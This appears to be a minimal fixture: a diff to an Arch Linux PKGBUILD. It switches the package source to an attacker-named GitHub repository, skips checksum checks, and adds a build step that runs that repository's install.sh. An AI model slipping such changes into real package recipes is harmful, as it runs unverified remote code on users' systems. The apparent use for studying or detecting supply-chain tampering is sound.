@@ -1,0 +1,15 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,6 +1,9 @@
+ pkgname=demo
+ pkgver=1
+ pkgrel=1
+-url=https://github.com/upstream/project
+-source=("https://example.invalid/old.tar.gz")
+-sha256sums=('SKIP')
++url=https://github.com/upstream/project
++source=('git+https://github.com/attacker/patch.git')
++sha256sums=('SKIP')
++package() {
++  bash patch/install.sh
++}
